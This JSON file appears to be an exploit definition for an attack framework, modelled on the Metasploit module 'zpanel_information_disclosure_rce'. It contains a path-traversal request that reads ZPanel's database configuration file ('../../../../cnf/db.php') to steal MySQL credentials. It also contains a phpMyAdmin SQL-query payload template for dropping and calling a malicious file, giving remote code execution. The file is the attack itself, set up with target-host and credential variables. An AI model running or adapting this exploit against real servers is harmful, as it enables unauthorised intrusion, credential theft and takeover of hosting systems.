{
   "type" : "MSF",
   "path" : "Action=View&Script=../../../../cnf/db.php&token=__TOKEN__&",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "detection" : {},
   "ctype" : "application/x-www-form-urlencoded; charset=UTF-8",
   "informations" : {
      "METHOD" : "GET",
      "PATH" : "Action=View&Script=../../../../cnf/db.php&token=__TOKEN__&",
      "PATHS" : [
         "zpanel"
      ],
      "REFERENCES" : [
         "http://blog.0xlabs.com/2014/03/zpanel-10.1.x-remote-root.html",
         "http://pastebin.com/y5Pf4Yms"
      ],
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "VARIABLES" : {
         "RHOST" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "_NOCACHE" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "URI" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "PATH" : {
            "DESCRIPTION" : "The base path to Zpanel",
            "VALUE" : "/zpanel"
         },
         "FNAME" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "SQL_QUERY" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PMA_PASSWORD" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PMA_USERNAME" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "SID" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "TOKEN" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         }
      },
      "CTYPE" : "application/x-www-form-urlencoded; charset=UTF-8",
      "MSF_MODULE" : "zpanel_information_disclosure_rce",
      "TITLE" : "Zpanel Remote Unauthenticated RCE",
      "DESCRIPTION" : "\n\n        This module exploits an information disclosure vulnerability\n\n        in ZPanel. The vulnerability is due to a vulnerable version\n\n        of pChart used by ZPanel that allows unauthenticated users to read\n\n        arbitrary files remotely on the file system. This particular module\n\n        utilizes this vulnerability to identify the username/password\n\n        combination of the MySQL instance. With the\n\n        credentials the attackers can login to PHPMyAdmin and execute\n\n        SQL commands to drop a malicious payload on the filesystem and\n\n        call it leading to remote code execution.\n\n      ",
      "name" : "ZpanelInformationDisclosureRce",
      "REQUESTS" : {
         "EXPLOIT2" : {
            "TEXT" : "Sending Exploit #2 Request : [GET] ",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "PAYLOAD" : "",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            },
            "PATH" : "",
            "METHOD" : "GET"
         }
      },
      "PAYLOAD" : "pma_username=__PMA_USERNAME__&pma_password=__PMA_PASSWORD__&server=1&lang=en&collation_connection=utf8_general_ci&token=__TOKEN__&is_js_confirmed=0&token=__TOKEN__&pos=0&goto=server_sql.php&message_to_show=Your+SQL+query+has+been+executed+successfully&prev_sql_query=&sql_query=__SQL_QUERY__&sql_delimiter=;&show_query=1&ajax_request=true&_nocache=___NOCACHE__&",
      "OSVDB" : 102595
   },
   "platform" : "MULTI",
   "method" : "GET",
   "description" : "\n\n        This module exploits an information disclosure vulnerability\n\n        in ZPanel. The vulnerability is due to a vulnerable version\n\n        of pChart used by ZPanel that allows unauthenticated users to read\n\n        arbitrary files remotely on the file system. This particular module\n\n        utilizes this vulnerability to identify the username/password\n\n        combination of the MySQL instance. With the\n\n        credentials the attackers can login to PHPMyAdmin and execute\n\n        SQL commands to drop a malicious payload on the filesystem and\n\n        call it leading to remote code execution.\n\n      ",
   "payload" : "pma_username=__PMA_USERNAME__&pma_password=__PMA_PASSWORD__&server=1&lang=en&collation_connection=utf8_general_ci&token=__TOKEN__&is_js_confirmed=0&token=__TOKEN__&pos=0&goto=server_sql.php&message_to_show=Your+SQL+query+has+been+executed+successfully&prev_sql_query=&sql_query=__SQL_QUERY__&sql_delimiter=;&show_query=1&ajax_request=true&_nocache=___NOCACHE__&",
   "title" : "Zpanel Remote Unauthenticated RCE",
   "variables" : {
      "TOKEN" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "SID" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PMA_USERNAME" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "PMA_PASSWORD" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "SQL_QUERY" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "FNAME" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "The base path to Zpanel",
         "VALUE" : "/zpanel"
      },
      "URI" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "_NOCACHE" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "RHOST" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "name" : "ZpanelInformationDisclosureRce",
   "references" : [
      "http://blog.0xlabs.com/2014/03/zpanel-10.1.x-remote-root.html",
      "http://pastebin.com/y5Pf4Yms"
   ],
   "msf_module" : "zpanel_information_disclosure_rce",
   "requests" : {
      "EXPLOIT2" : {
         "TEXT" : "Sending Exploit #2 Request : [GET] ",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "PAYLOAD" : "",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         },
         "PATH" : "",
         "METHOD" : "GET"
      }
   },
   "paths" : [
      "zpanel"
   ],
   "osvdb" : 102595
}
